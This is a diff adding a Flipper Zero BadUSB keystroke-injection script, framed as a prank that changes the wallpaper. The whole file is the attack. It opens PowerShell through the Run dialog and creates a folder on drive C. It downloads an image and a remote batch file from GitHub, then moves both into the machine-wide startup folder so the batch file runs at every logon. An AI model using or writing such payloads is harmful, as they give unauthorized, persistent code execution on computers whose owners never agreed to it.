@@ -1,0 +1,53 @@
+REM Title: TrolloWallpaper
+REM Autor: 8ad3rror
+REM Info[PL]: Ściąga tapete trollo.jpg i AutoWall.bat do folderu na dysku C, przenosi AutoWall.bat do autostartu i uruchamia go
+
+DELAY 100
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING $folderPath = "C:\AutoWall"
+ENTER
+STRING if (-Not (Test-Path -Path $folderPath)) {New-Item -Path $folderPath -ItemType Directory}
+ENTER
+STRING $fileUrl = "https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/trollo.jpg"
+ENTER
+STRING $filePath = "$folderPath\trollo.jpg"
+ENTER
+STRING $fileUrl2 = "https://github.com/8ad3rror/Flipper-Zero/raw/refs/heads/main/BadUSB/Troll/TrolloWallpaper/AutoWall.bat"
+ENTER
+STRING $filePath2 = "$folderPath\AutoWall.bat"
+ENTER
+STRING Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
+ENTER
+STRING Invoke-WebRequest -Uri $fileUrl2 -OutFile $filePath2
+ENTER
+STRING EXIT
+ENTER
+DELAY 200
+GUI r
+STRING C:\AutoWall
+ENTER
+DELAY 1000
+STRING a
+DELAY 1000
+CTRL x
+DELAY 1000
+ALT F4
+DELAY 200
+GUI r
+STRING shell:common startup
+ENTER
+DELAY 1000
+CTRL V
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ALT F4
+DELAY 100
+GUI d
+
